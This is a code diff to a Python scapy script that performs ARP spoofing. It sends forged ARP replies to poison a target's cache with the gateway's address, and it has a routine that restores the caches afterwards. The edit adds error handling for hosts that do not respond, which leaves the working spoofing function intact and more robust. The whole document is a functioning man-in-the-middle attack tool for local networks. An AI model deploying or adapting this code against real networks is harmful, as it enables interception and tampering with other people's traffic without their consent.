@@ -9,16 +9,24 @@ def scan(target_ip):
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
-    return answered[0][1].hwsrc
+    if answered:
+        return answered[0][1].hwsrc
+    else:
+        print(f"[-] No response from IP: {target_ip}")
+        return None
 
 def arpspoof(target_ip, gateway_ip):
     target_mac = scan(target_ip)
+    if target_mac is None:
+        return
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
     scapy.send(packet, verbose = False)
 
 def restore(target_ip, gateway_ip):
     target_mac = scan(target_ip)
     gateway_mac = scan(gateway_ip)
+    if target_mac is None or gateway_mac is None:
+        return
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
     scapy.send(packet, verbose = False)
 
